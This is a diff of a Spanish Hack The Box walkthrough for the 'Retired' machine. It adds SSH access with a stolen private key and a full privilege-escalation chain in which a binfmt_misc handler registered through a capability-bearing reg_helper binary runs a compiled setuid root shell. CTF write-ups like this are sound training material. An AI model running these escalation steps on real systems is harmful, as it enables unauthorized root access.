@@ -2,6 +2,11 @@
 ![Retired](https://user-images.githubusercontent.com/96772264/213869676-8cef5005-ac7b-45a2-9745-78ff28d10f9a.png)
 
 ------------------------
+**Disclaimer**: esta maquina catalogada como media por htb, pero que deberia ser hard, debido a su complejidad uve que tirar del writeup 
+de [ippsec](https://www.youtube.com/watch?v=1MDqn1kBHQM). Aun asi me ha servido como aprendizaje y al poder entender todo el proceso lo he explicado
+para que quede mas claro que el agua.
+
+
 # Part 1: Enumeración
 Puertos abiertos -> 22(ssh), 80(http)
 ```console
@@ -125,11 +130,6 @@ Con netcat y python podemos interactuar mejor:
 [+] reading 1094795585 bytes
 [+] activated license: AAAAAA
 ```
---------------------------------
-**Disclaimer**: A partir de aqui tuve que tirar del [writeup de s4vitar](https://www.youtube.com/watch?v=ys-az6SyheE) porque es un ROP muy complejo,
-asi que el credito es suyo.
-En vez de empaquetar con pwmtools como él (p64) lo he hecho con una libreria llamada struct que es propia de python. Hace lo mismo.
-
 ----------------------------
 # Part 4: Desensamblando el binario
 
@@ -393,4 +393,72 @@ drwx------ 2 www-data www-data 4096 Mar 11  2022 activate_license
 drwx------ 3 www-data www-data 4096 Mar 11  2022 emuemu
 ```
 Si nos copiamos su id_rsa del directorio .shh y le damos los permisos ```chmod 600 ir_rsa``` podemos acceder por ssh a dicho usuario.
+```ssh -i id_rsa dev@10.10.11.154```
 
+-------------------
+# Part 7: Escalada de privilegios a root: reg_helper
+
+En el home esta el bianrio activate_licens que explotamos antes, la flag y la carpeta emuemu (mencionada en la web)
+```console
+dev@retired:~/emuemu$ ls
+Makefile  README.md  emuemu  emuemu.c  reg_helper  reg_helper.c  test
+dev@retired:~/emuemu$ cat README.md 
+
+EMUEMU es el software oficial de emulado para la consola OSTRICH
+Despues de la instalación con 'make install', las ROMs de OSTRICH pueden ser ejecutados desde el terminal.
+Por ejemplo la ROM llamada 'rom' se puede correr con './rom'
+```
+Tambien tenemos emuemu.c que simplemente imprime "EMUEMU está todavia en desarollo"
+Luego tenemos reg_helper.c
+```c
+#define _GNU_SOURCE
+int main(void) {
+    char cmd[512] = { 0 };   // Buffer vario de 512 bytes "cmd"
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;   // Lee del standar imput el cmd
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);  // Abre /proc/sys/fs/binfmt_misc/register para escritura
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)   // Escribe el cmd dentro
+        perror("write");
+    if (close(fd) == -1)
+        perror("close");
+	return 0;}
+```
+El makefile tiene dos lineas interesantes:
+```
+setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' | tee /usr/lib/binfmt.d/emuemu.conf | /usr/lib/emuemu/reg_helper
+```
+Es decir mete en /usr/lib/binfmt.d/emuemu.conf esa linea rara ':EMUEMU:M::..' y de ahi a reg_helper, que dice que todo lo que le entre ira 
+a /proc/sys/fs/binfmt_misc/register
+
+Como bien dicen, este binario tiene esta capability (primero tuve que retocar el PATH para verla porque era muy corto)
+Dicha capability te permite cambiar de usaurio y grupo.
+```console
+dev@retired:~/emuemu$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+dev@retired:~/emuemu$ getcap -r / 2>/dev/null /usr/bin/ping cap_net_raw=ep
+/usr/lib/emuemu/reg_helper cap_dac_override=ep
+```
+La capability se pasa sobre este "/usr/lib/emuemu/reg_helper" que a su vez como nos dice su código, llama a binfmt_misc.
+Una busqueda en google de dicha cosa (binfmt_misc) nos dice que:
+ > binfmt_misc: binario de linux que permite que ciertos programas ejecuten otros con formatos raros, como emuladores y maquinas virtuales.
+Este binario tiene un archivo de una sola linea llamado "register" que define que programa ejecuta que cosa:
+```:nombre:tipo:offset:magic:mask:interprete:flags```
+Las opciones offset magic y mask son para el tipo si es "M" de magic number, el otro posible es "E" de extension, esta es la que usaremos, porque 
+es mas sencilla:
+> ":PWN:E::xii::/tmp/shell:C" -> Archivo "PWN" con la extension xii que ejecutara el programa /tmp/shell con la flag C (mantiene privilegios)
+La idea seria escribirlo en "/proc/sys/fs/binfmt_misc/register" pero no nos deja, asi que lo hacemos en reg_helper que, repito, escribe 
+en "register" lo que se le pase por el stdin.
+```
+dev@retired:~/emuemu$ echo ":PWN:E::xii::/tmp/shell:C" | /usr/lib/emuemu/reg_helper
+dev@retired:~/emuemu$ nano /tmp/shell
+int main(void){
+    setuid(0); setgid(0); system("/bin/bash");
+}
+dev@retired:/tmp$ gcc shell.c -o shell
+dev@retired:/tmp$ find / -perm -4000 2>/dev/null | head -n 1
+/usr/bin/newgrp
+dev@retired:/tmp$ ln -s /usr/bin/newgrp PWN.xii
+dev@retired:/tmp$ ./PWN.xii
+root@retired:/tmp#
+```
